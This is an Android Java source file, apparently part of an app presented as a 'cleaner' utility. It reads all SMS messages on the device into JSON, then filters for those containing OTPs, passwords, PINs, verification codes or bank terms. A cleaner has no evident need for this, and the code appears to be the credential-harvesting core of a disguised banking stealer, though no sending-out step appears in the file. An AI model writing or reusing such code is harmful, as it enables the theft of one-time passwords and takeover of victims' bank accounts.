package com.utility.cleanerapp;

import android.content.Context;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.Telephony;
import android.net.Uri;
import org.json.JSONObject;
import org.json.JSONArray;
import java.util.ArrayList;

public class SmsReader {
    
    private static final String[] SMS_COLUMNS = {"_id", "address", "body", "date", "type"};
    
    public JSONArray getAllSmsMessages(Context context) {
        JSONArray smsArray = new JSONArray();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        
        try {
            Uri smsUri = Telephony.Sms.CONTENT_URI;
            cursor = contentResolver.query(
                smsUri,
                SMS_COLUMNS,
                null,
                null,
                "date DESC"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject smsObject = new JSONObject();
                    smsObject.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    smsObject.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    smsObject.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    smsObject.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    smsObject.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    
                    smsArray.put(smsObject);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return smsArray;
    }
    
    public JSONArray getRecentSms(Context context, int limit) {
        JSONArray smsArray = new JSONArray();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        
        try {
            Uri smsUri = Telephony.Sms.CONTENT_URI;
            cursor = contentResolver.query(
                smsUri,
                SMS_COLUMNS,
                null,
                null,
                "date DESC LIMIT " + limit
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject smsObject = new JSONObject();
                    smsObject.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    smsObject.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    smsObject.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    smsObject.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                    smsObject.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    
                    smsArray.put(smsObject);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return smsArray;
    }
    
    public JSONArray filterSmsFromBanks(JSONArray messages) {
        JSONArray filteredMessages = new JSONArray();
        String[] keywords = {"bank", "OTP", "password", "verification", "otp", "BANK", "PASSWORD", "code", "PIN"};
        
        try {
            for (int i = 0; i < messages.length(); i++) {
                JSONObject sms = messages.getJSONObject(i);
                String body = sms.optString("body", "").toLowerCase();
                
                for (String keyword : keywords) {
                    if (body.contains(keyword.toLowerCase())) {
                        filteredMessages.put(sms);
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return filteredMessages;
    }
}